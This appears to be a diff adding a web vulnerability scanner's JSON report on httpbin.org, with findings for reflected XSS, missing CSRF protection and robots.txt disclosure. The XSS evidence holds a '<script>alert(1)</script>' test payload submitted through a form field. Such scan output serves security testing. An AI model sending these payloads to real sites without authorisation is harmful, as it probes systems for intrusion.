+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<script>alert(1)</script>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    }
+  ],
+  "csrf": [
+    {
+      "type": "CSRF Vulnerability",
+      "form_action": "https://httpbin.org/post",
+      "method": "post",
+      "issue": "No CSRF protection detected",
+      "severity": "Medium"
+    }
+  ],
+  "directory_traversal": [],
+  "file_inclusion": [],
+  "command_injection": [],
+  "xxe": [],
+  "ssrf": [],
+  "open_redirect": [],
+  "information_disclosure": [
+    {
+      "type": "Information Disclosure",
+      "url": "https://httpbin.org/robots.txt",
+      "file": "/robots.txt",
+      "evidence": "User-agent: *\nDisallow: /deny\n",
+      "status_code": 200
+    },
+    {
+      "type": "Information Disclosure",
+      "url": "https://httpbin.org/robots.txt",
+      "file": "/robots.txt",
+      "evidence": "User-agent: *\nDisallow: /deny\n",
+      "status_code": 200
+    }
+  ]
+}
